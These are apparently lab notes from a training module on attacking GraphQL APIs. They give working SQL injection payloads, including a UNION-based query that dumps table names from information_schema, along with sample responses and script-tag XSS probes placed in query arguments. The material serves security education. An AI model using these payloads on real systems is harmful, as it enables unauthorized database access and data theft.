## SQL Injection

```
{
 "query":"{postByAuthor { id title }}"
}
```
- Returns error that author is a required argument

```
{
 "query":"{postByAuthor(author: \"admin\") { id title }}"
}
```
- Executed successfully
- Now we can check if this argument is vulnerable to SQL injection

```
{
 "query":"{postByAuthor(author: \"admin' -- -\") { id title }}"
}
```
- Returned null, so not vulnerable

user query also requires an argument.
```
{
 "query":"{user(username: \"htb-stdnt'\") { uuid username role }}"
}
```
- Returns a SQL error, so it is vulnerable!

Based on the introspection query, the UserObject consists of six fields (columns), so our UNION-base SQL injection payload needs to contain siz columns to match the number of columns in the original query.
```
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
    username
  }
}
```

Response:
```
{
  "data": {
    "user": {
      "username": "user,secret,post"
    }
  }
}
```


## Cross=Site Scripting (XSS)

Can occur if invalid arguments are reflected in error messages.

```
{
 "query":"{user(username: \"<script>alert(1)</script>\") { uuid username role }}"
}
```
- Returns null, so not vulnerable

```
{
 "query":"{post(id: \"<script>alert(1)</script>\") { id title body category author { username }}}"
}
```
- Visiting /post?id=<script>alert(1)</script> breaks
